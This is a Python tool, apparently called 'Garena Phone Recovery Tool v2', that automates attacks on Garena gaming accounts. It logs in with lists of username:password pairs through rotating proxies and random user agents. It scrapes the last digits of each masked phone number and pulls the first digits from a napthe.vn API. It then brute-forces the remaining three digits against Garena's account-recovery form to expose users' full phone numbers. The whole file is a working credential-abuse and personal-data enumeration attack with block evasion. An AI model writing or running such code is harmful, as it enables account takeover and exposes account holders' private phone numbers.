import argparse
import asyncio
import json
import random
import re
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import List, Optional, Tuple, Dict
from urllib.parse import urlparse

import aiofiles
from playwright.async_api import TimeoutError as PlaywrightTimeoutError
from playwright.async_api import async_playwright

LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
ACCOUNT_URL = "https://account.garena.com/"
NAPTHE_LOGIN_URL = "https://napthe.vn/"
NAPTHE_API_URL = "https://napthe.vn/api/auth/get_user_info/multi"
RECOVERY_URL = "https://account.garena.com/recovery#/"

SELECTORS = {
    "username": "input[name='username'], input[type='text']",
    "password": "input[name='password'], input[type='password']",
    "login_button": "button[type='submit'], button:has-text('Đăng nhập'), button:has-text('đăng nhập')",
    "captcha": "iframe[src*='captcha'], text=CAPTCHA, text=captcha, div[class*='captcha']",
    "otp": "text=OTP, text=mã xác minh, text=xác minh, input[placeholder*='OTP']",
    "masked_phone": [
        "text=/^\\+?84\\s?\\*{2,}\\d{3,4}$/",
        "text=/^0\\*{2,}\\d{3,4}$/",
        "text=/\\*+\\d{2,4}/",
        "text=/\\d{3}\\*+\\d{4}/",
    ],
    "recovery_phone_input": "input[name='phone'], input[placeholder*='phone'], input[placeholder*='số điện thoại']",
    "recovery_submit": "button:has-text('Xác nhận'), button:has-text('xác nhận'), button[type='submit']",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


@dataclass
class Phase1Result:
    """Phase 1: Garena login & extract last 4 digits"""
    login_status: str
    last_4_digits: str = ""
    masked_phone: str = ""
    error: str = ""


@dataclass
class Phase2Result:
    """Phase 2: napthe.vn API & extract first 3 digits"""
    api_status: str
    first_3_digits: str = ""
    error: str = ""


@dataclass
class Phase3Result:
    """Phase 3: Recovery brute-force & complete phone"""
    recovery_status: str
    complete_phone: str = ""
    attempts: int = 0
    error: str = ""


@dataclass
class AuditResult:
    """Complete audit result with all phases"""
    username: str
    status: str  # success | failed | manual_required
    timestamp: str = ""
    proxy_used: str = ""
    user_agent: str = ""
    phase1: Phase1Result = field(default_factory=lambda: Phase1Result("failed"))
    phase2: Phase2Result = field(default_factory=lambda: Phase2Result("failed"))
    phase3: Phase3Result = field(default_factory=lambda: Phase3Result("failed"))


class RotatingProxyRotator:
    """Manages rotating proxy list with health tracking.
    
    Supports format: host:port (auto-converts to http://host:port)
    """
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = [self._normalize_proxy(p) for p in proxy_list]
        self.current_index = 0
        self.dead_proxies = set()
        self.lock = asyncio.Lock()
        self.failed_count = {proxy: 0 for proxy in self.proxies}
        self.success_count = {proxy: 0 for proxy in self.proxies}
    
    def _normalize_proxy(self, proxy: str) -> str:
        """Convert host:port to http://host:port if needed."""
        if "://" not in proxy:
            return f"http://{proxy}"
        return proxy
    
    async def get_next_proxy(self) -> Optional[str]:
        """Get next healthy proxy in round-robin fashion."""
        if not self.proxies:
            return None
        
        async with self.lock:
            healthy = [p for p in self.proxies if p not in self.dead_proxies]
            
            if not healthy:
                print("[PROXY] All proxies dead, resetting...")
                self.dead_proxies.clear()
                healthy = self.proxies
            
            if not healthy:
                return None
            
            proxy = healthy[self.current_index % len(healthy)]
            self.current_index += 1
            return proxy
    
    async def mark_success(self, proxy: str) -> None:
        """Mark proxy as successful."""
        async with self.lock:
            self.success_count[proxy] = self.success_count.get(proxy, 0) + 1
            self.failed_count[proxy] = 0
            self.dead_proxies.discard(proxy)
    
    async def mark_dead(self, proxy: str) -> None:
        """Mark proxy as dead after 3 failures."""
        async with self.lock:
            self.failed_count[proxy] = self.failed_count.get(proxy, 0) + 1
            if self.failed_count[proxy] >= 3:
                self.dead_proxies.add(proxy)
                print(f"[PROXY] Dead: {proxy}")
    
    async def get_stats(self) -> dict:
        """Get proxy statistics."""
        async with self.lock:
            return {
                "total": len(self.proxies),
                "dead": len(self.dead_proxies),
                "healthy": len(self.proxies) - len(self.dead_proxies),
                "success_count": dict(self.success_count),
                "failed_count": dict(self.failed_count),
            }


async def read_proxy_list(path: str) -> List[str]:
    """Read proxy list from file (host:port format)."""
    proxies = []
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            async for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if line and not line.startswith("#"):
                    proxies.append(line)
        print(f"[PROXY] Loaded {len(proxies)} rotating proxies from {path}")
    except FileNotFoundError:
        print(f"[WARN] Proxy file not found: {path}")
    return proxies


class RateLimiter:
    """Adaptive rate limiter."""
    
    def __init__(self, delay: float):
        self.delay = delay
        self.lock = asyncio.Lock()
        self.last_run = 0.0
        self.dynamic_delay = delay

    async def wait(self) -> None:
        """Wait for configured delay."""
        async with self.lock:
            elapsed = time.time() - self.last_run
            if elapsed < self.dynamic_delay:
                await asyncio.sleep(self.dynamic_delay - elapsed)
            self.last_run = time.time()
    
    async def increase_delay(self, factor: float = 1.5) -> None:
        """Increase delay when rate limiting detected."""
        async with self.lock:
            old_delay = self.dynamic_delay
            self.dynamic_delay = min(self.dynamic_delay * factor, 60.0)
            print(f"[RATE] Delay: {old_delay:.1f}s → {self.dynamic_delay:.1f}s")


async def read_accounts(path: str) -> List[Tuple[str, str]]:
    """Read accounts from file."""
    accounts: List[Tuple[str, str]] = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        async for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            username, password = line.split(":", 1)
            if username.strip() and password.strip():
                accounts.append((username.strip(), password.strip()))
    return accounts


async def is_visible(page, selector: str, timeout: int = 1500) -> bool:
    """Check if element is visible."""
    try:
        locator = page.locator(selector).first
        await locator.wait_for(timeout=timeout)
        return await locator.is_visible()
    except Exception:
        return False


def extract_last_4(masked_phone: str) -> str:
    """Extract last 4 digits from masked phone."""
    digits = re.findall(r"\d", masked_phone or "")
    if len(digits) >= 4:
        return "".join(digits[-4:])
    return ""


def extract_first_3(phone_str: str) -> str:
    """Extract first 3 digits from phone."""
    digits = re.findall(r"\d", phone_str or "")
    if len(digits) >= 3:
        return "".join(digits[:3])
    return ""


def is_still_on_login_page(url: str) -> bool:
    """Check if on login page."""
    parsed = urlparse(url)
    hostname = (parsed.hostname or "").lower()
    path = (parsed.path or "").lower()
    return hostname == "sso.garena.com" and "/login" in path


async def fetch_masked_phone(page) -> str:
    """Fetch masked phone with multiple fallbacks."""
    for selector in SELECTORS["masked_phone"]:
        try:
            loc = page.locator(selector).first
            await loc.wait_for(timeout=1500)
            text = (await loc.inner_text()).strip()
            if text and re.search(r"\d", text):
                return " ".join(text.split())
        except Exception:
            continue
    
    # Fallback
    try:
        page_text = await page.evaluate("() => document.body.innerText")
        patterns = [r"\+84\s?\*{2,}\d{3,4}", r"0\*{2,}\d{3,4}", r"\*{2,}\d{2,4}"]
        for pattern in patterns:
            matches = re.findall(pattern, page_text)
            if matches:
                return matches[0]
    except Exception:
        pass
    
    return ""


async def phase1_garena_login(
    username: str,
    password: str,
    timeout: int,
    proxy: Optional[str],
) -> Phase1Result:
    """Phase 1: Login to Garena and extract last 4 digits of phone."""
    result = Phase1Result(login_status="failed")
    
    launch_kwargs = {"headless": True, "args": ["--no-sandbox"]}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 1] Garena login...")
            
            # Navigate to login
            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
            
            # Check CAPTCHA before login
            if await is_visible(page, SELECTORS["captcha"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "CAPTCHA before login - solve manually"
                print("[CAPTCHA] Before login. Press ENTER after solving...")
                try:
                    await asyncio.to_thread(input)
                    await asyncio.sleep(2)
                except KeyboardInterrupt:
                    result.error = "Cancelled by user"
                    return result
            
            # Fill credentials
            await page.fill(SELECTORS["username"], username)
            await page.fill(SELECTORS["password"], password)
            await page.click(SELECTORS["login_button"])
            
            # Wait for navigation
            await asyncio.sleep(2)
            try:
                await page.wait_for_load_state("networkidle", timeout=5000)
            except PlaywrightTimeoutError:
                print("  [WARN] networkidle timeout")
            
            # Check OTP
            if await is_visible(page, SELECTORS["otp"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "OTP required - solve manually"
                print("[OTP] Required. Press ENTER after solving...")
                try:
                    await asyncio.to_thread(input)
                    await asyncio.sleep(2)
                except KeyboardInterrupt:
                    result.error = "Cancelled by user"
                    return result
            
            # Check CAPTCHA after login
            if await is_visible(page, SELECTORS["captcha"], timeout=1000):
                result.login_status = "manual_required"
                result.error = "CAPTCHA after login - solve manually"
                print("[CAPTCHA] After login. Press ENTER when solved...")
                try:
                    await asyncio.to_thread(input)
                    await asyncio.sleep(2)
                except KeyboardInterrupt:
                    result.error = "Cancelled by user"
                    return result
            
            # Check if still on login page
            if is_still_on_login_page(page.url):
                result.login_status = "failed"
                result.error = "Invalid credentials or blocked"
                return result
            
            # Navigate to account page
            await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(1)
            
            masked_phone = await fetch_masked_phone(page)
            result.masked_phone = masked_phone
            result.last_4_digits = extract_last_4(masked_phone)
            
            if result.last_4_digits:
                result.login_status = "success"
                print(f"  [Phase 1] ✓ Last 4 digits: {result.last_4_digits}")
            else:
                result.login_status = "failed"
                result.error = "Could not extract phone digits"
            
            await browser.close()
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass


async def phase2_napthe_api(
    napthe_username: str,
    napthe_password: str,
    garena_username: str,
    timeout: int,
    proxy: Optional[str],
) -> Phase2Result:
    """Phase 2: Login to napthe.vn and extract first 3 digits from API."""
    result = Phase2Result(api_status="failed")
    
    launch_kwargs = {"headless": True, "args": ["--no-sandbox"]}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 2] napthe.vn login...")
            
            # Navigate to napthe.vn
            await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(1)
            
            # Try to find and fill login form
            try:
                await page.fill("input[name='username'], input[type='email']", napthe_username)
                await page.fill("input[name='password'], input[type='password']", napthe_password)
                await page.click("button[type='submit'], button:has-text('Đăng nhập')")
                
                await asyncio.sleep(2)
                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except PlaywrightTimeoutError:
                    pass
            except Exception as e:
                result.error = f"Login failed: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Call API with garena username
            print(f"  [Phase 2] Calling API with username: {garena_username}")
            
            try:
                # Try to get user info via API
                api_response = await page.evaluate(f"""
                    fetch('{NAPTHE_API_URL}', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{username: '{garena_username}'}})
                    }}).then(r => r.json())
                """)
                
                if api_response and isinstance(api_response, dict):
                    # Extract phone from response
                    phone = api_response.get("phone") or api_response.get("mobile") or ""
                    if phone:
                        result.first_3_digits = extract_first_3(phone)
                        if result.first_3_digits:
                            result.api_status = "success"
                            print(f"  [Phase 2] ✓ First 3 digits: {result.first_3_digits}")
                            await browser.close()
                            return result
                
                result.error = "No phone data in API response"
                await browser.close()
                return result
            
            except Exception as e:
                result.error = f"API error: {str(e)[:100]}"
                await browser.close()
                return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result


async def phase3_recovery_brute_force(
    username: str,
    first_3_digits: str,
    last_4_digits: str,
    phase3_delay: float,
    timeout: int,
    proxy: Optional[str],
) -> Phase3Result:
    """Phase 3: Brute-force middle 3 digits to find complete phone."""
    result = Phase3Result(recovery_status="failed")
    
    if not first_3_digits or not last_4_digits:
        result.error = "Missing first 3 or last 4 digits"
        return result
    
    launch_kwargs = {"headless": True, "args": ["--no-sandbox"]}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    found = False
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 3] Brute-force recovery (1000 attempts)...")
            print(f"  [Phase 3] Pattern: {first_3_digits}XXX{last_4_digits}")
            
            # Navigate to recovery page
            await page.goto(RECOVERY_URL, wait_until="domcontentloaded", timeout=timeout)
            await asyncio.sleep(2)
            
            # Brute-force middle 3 digits (000-999)
            for middle_attempt in range(0, 1000):
                result.attempts = middle_attempt + 1
                
                # Construct phone number
                middle = str(middle_attempt).zfill(3)
                test_phone = f"{first_3_digits}{middle}{last_4_digits}"
                
                try:
                    # Find phone input and clear it
                    phone_input = page.locator(SELECTORS["recovery_phone_input"]).first
                    await phone_input.fill("")
                    await phone_input.fill(test_phone)
                    
                    # Click verify button
                    await page.click(SELECTORS["recovery_submit"])
                    
                    # Wait for response
                    await asyncio.sleep(phase3_delay)
                    
                    # Check if success (phone accepted)
                    current_url = page.url
                    page_content = await page.content()
                    
                    # Success indicators
                    success_indicators = [
                        "success",
                        "verified",
                        "xác nhận thành công",
                        "valid",
                        "accepted",
                    ]
                    
                    is_success = any(ind.lower() in page_content.lower() for ind in success_indicators)
                    
                    if is_success:
                        result.complete_phone = test_phone
                        result.recovery_status = "success"
                        found = True
                        print(f"  [Phase 3] ✓ Found: {test_phone} (attempt {result.attempts})")
                        await browser.close()
                        return result
                    
                    # Check for soft-block / rate limit
                    if "429" in page_content or "too many" in page_content.lower():
                        result.error = "Rate limited (429)"
                        await browser.close()
                        return result
                    
                    if "locked" in page_content.lower() or "khóa" in page_content.lower():
                        result.error = "Account locked"
                        await browser.close()
                        return result
                    
                    if (middle_attempt + 1) % 100 == 0:
                        print(f"  [Phase 3] {result.attempts}/1000 attempts...")
                
                except Exception as e:
                    if middle_attempt % 50 == 0:
                        print(f"  [Phase 3] Error at {result.attempts}: {str(e)[:50]}")
                    await asyncio.sleep(phase3_delay)
                    continue
            
            if not found:
                result.error = "No valid phone found in 1000 attempts"
                result.recovery_status = "failed"
            
            await browser.close()
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result


async def process_account(
    username: str,
    password: str,
    napthe_user: str,
    napthe_pass: str,
    args,
    proxy_rotator: Optional[RotatingProxyRotator],
    limiter: RateLimiter,
) -> AuditResult:
    """Process single account through all 3 phases."""
    result = AuditResult(
        username=username,
        status="failed",
        timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        user_agent=random.choice(USER_AGENTS),
    )
    
    proxy = None
    if proxy_rotator:
        proxy = await proxy_rotator.get_next_proxy()
        result.proxy_used = proxy or ""
    
    # Phase 1: Garena login
    print(f"[Phase 1] {username}...")
    result.phase1 = await phase1_garena_login(username, password, args.timeout, proxy)
    
    if result.phase1.login_status != "success":
        result.status = result.phase1.login_status
        if proxy and proxy_rotator:
            await proxy_rotator.mark_dead(proxy)
        return result
    
    await asyncio.sleep(args.phase_delay)  # Delay between phases
    
    # Phase 2: napthe.vn API
    if napthe_user and napthe_pass:
        print(f"[Phase 2] {username}...")
        result.phase2 = await phase2_napthe_api(
            napthe_user, napthe_pass, username, args.timeout, proxy
        )
        
        if result.phase2.api_status != "success":
            result.status = "failed"
            result.phase2.error = "Could not extract first 3 digits from API"
            if proxy and proxy_rotator:
                await proxy_rotator.mark_dead(proxy)
            return result
        
        await asyncio.sleep(args.phase_delay)
        
        # Phase 3: Recovery brute-force
        print(f"[Phase 3] {username}...")
        result.phase3 = await phase3_recovery_brute_force(
            username,
            result.phase2.first_3_digits,
            result.phase1.last_4_digits,
            args.phase3_delay,
            args.timeout,
            proxy,
        )
        
        if result.phase3.recovery_status == "success":
            result.status = "success"
            if proxy and proxy_rotator:
                await proxy_rotator.mark_success(proxy)
        else:
            result.status = "failed"
            if proxy and proxy_rotator:
                await proxy_rotator.mark_dead(proxy)
    else:
        result.status = "failed"
        result.phase2.error = "napthe.vn credentials not provided"
    
    return result


async def save_outputs(results: List[AuditResult], output_prefix: str, proxy_stats: Optional[dict] = None) -> None:
    """Save results to JSON and TXT files."""
    json_path = Path(f"{output_prefix}.json")
    txt_path = Path(f"{output_prefix}.txt")

    async with aiofiles.open(json_path, "w", encoding="utf-8") as f:
        output_data = {
            "results": [asdict(r) for r in results],
            "proxy_stats": proxy_stats,
            "summary": {
                "total": len(results),
                "success": len([r for r in results if r.status == "success"]),
                "failed": len([r for r in results if r.status == "failed"]),
                "manual_required": len([r for r in results if r.status == "manual_required"]),
            }
        }
        await f.write(json.dumps(output_data, ensure_ascii=False, indent=2))

    async with aiofiles.open(txt_path, "w", encoding="utf-8") as f:
        for r in results:
            line = (
                f"{r.username}|"
                f"{r.status}|"
                f"{r.phase1.last_4_digits}|"
                f"{r.phase2.first_3_digits}|"
                f"{r.phase3.complete_phone}|"
                f"{r.phase3.attempts}|"
                f"{r.phase1.error or r.phase2.error or r.phase3.error}\n"
            )
            await f.write(line)

    print(f"\n[OK] Saved: {json_path}")
    print(f"[OK] Saved: {txt_path}")


async def worker(
    name: str,
    queue: asyncio.Queue,
    args,
    results: List[AuditResult],
    lock: asyncio.Lock,
    proxy_rotator: Optional[RotatingProxyRotator],
    limiter: RateLimiter,
) -> None:
    """Worker task."""
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break

        username, password = item
        await limiter.wait()
        print(f"\n[{name}] ═══════════════════════════════════")
        print(f"[{name}] Account: {username}")
        print(f"[{name}] ═══════════════════════════════════")

        result = await process_account(
            username, password,
            args.napthe_user,
            args.napthe_pass,
            args,
            proxy_rotator,
            limiter,
        )

        async with lock:
            results.append(result)

        status_emoji = "✓" if result.status == "success" else "✗" if result.status == "failed" else "⚠"
        phone_str = result.phase3.complete_phone or "N/A"
        print(f"[{name}] {status_emoji} Result: {result.status} | Phone: {phone_str}")
        queue.task_done()


async def main() -> None:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Garena Phone Recovery Tool v2 - Extract complete 10-digit phone number with Rotating Proxy"
    )
    parser.add_argument("-i", "--input", required=True, help="Input file (username:password)")
    parser.add_argument("-o", "--output", default="garena_recovery_result", help="Output prefix")
    parser.add_argument("--napthe-user", required=True, help="napthe.vn username")
    parser.add_argument("--napthe-pass", required=True, help="napthe.vn password")
    parser.add_argument("--proxy-list", default=None, help="Rotating proxy list file (host:port format)")
    parser.add_argument("--concurrency", type=int, default=1, help="Workers (1 recommended)")
    parser.add_argument("--delay", type=float, default=25.0, help="Delay between accounts (seconds)")
    parser.add_argument("--phase-delay", type=float, default=5.0, help="Delay between phases (seconds)")
    parser.add_argument("--phase3-delay", type=float, default=3.0, help="Delay between recovery attempts (seconds)")
    parser.add_argument("--timeout", type=int, default=45000, help="Timeout (ms)")
    args = parser.parse_args()

    if args.concurrency > 2:
        print("[WARN] Limiting concurrency to 1 (Garena blocks concurrent logins)")
        args.concurrency = 1

    accounts = await read_accounts(args.input)
    if not accounts:
        print("[ERR] No accounts found")
        return

    print(f"[OK] Loaded {len(accounts)} accounts")
    print(f"[CONFIG] Phase delays: {args.phase_delay}s | Recovery: {args.phase3_delay}s")

    # Setup rotating proxy rotator
    proxy_rotator = None
    if args.proxy_list:
        proxies = await read_proxy_list(args.proxy_list)
        if proxies:
            proxy_rotator = RotatingProxyRotator(proxies)
            print(f"[PROXY] Ready to rotate {len(proxies)} proxies (host:port format)")

    queue: asyncio.Queue = asyncio.Queue()
    for item in accounts:
        await queue.put(item)

    results: List[AuditResult] = []
    lock = asyncio.Lock()
    limiter = RateLimiter(args.delay)

    print(f"[START] {len(accounts)} accounts | {args.concurrency} workers")

    tasks = [
        asyncio.create_task(
            worker(f"W{i + 1}", queue, args, results, lock, proxy_rotator, limiter)
        )
        for i in range(args.concurrency)
    ]

    for _ in tasks:
        await queue.put(None)

    await queue.join()

    for task in tasks:
        await task

    proxy_stats = None
    if proxy_rotator:
        proxy_stats = await proxy_rotator.get_stats()
        print(f"\n[PROXY] Total: {proxy_stats['total']} | Healthy: {proxy_stats['healthy']} | Dead: {proxy_stats['dead']}")

    await save_outputs(results, args.output, proxy_stats)

    success = len([r for r in results if r.status == "success"])
    failed = len([r for r in results if r.status == "failed"])
    manual = len([r for r in results if r.status == "manual_required"])
    print(f"\n[FINAL] ✓ {success} | ✗ {failed} | ⚠ {manual}")


if __name__ == "__main__":
    asyncio.run(main())
